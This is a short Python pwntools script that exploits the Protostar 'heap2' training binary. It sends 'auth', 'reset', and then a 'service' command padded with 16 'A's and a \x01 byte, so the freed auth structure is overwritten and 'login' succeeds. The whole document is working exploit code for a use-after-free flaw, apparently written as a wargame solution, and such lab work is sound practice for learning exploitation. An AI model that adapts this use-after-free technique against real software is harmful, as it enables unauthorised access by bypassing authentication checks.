#!/usr/bin/python
from pwn import *
from ssh import *

binarypath='/opt/protostar/bin/heap2'
p=sh.run(binarypath)
p.recv()
def auth(name):
	p.sendline('auth '+name)
	p.recv()

def reset():
	p.sendline('reset')
	p.recv()

def service(name):
	p.sendline('service'+name)
	p.recv()
auth('yash')
reset()
service('A'*16+'\x01')
p.sendline('login')
print p.recvline()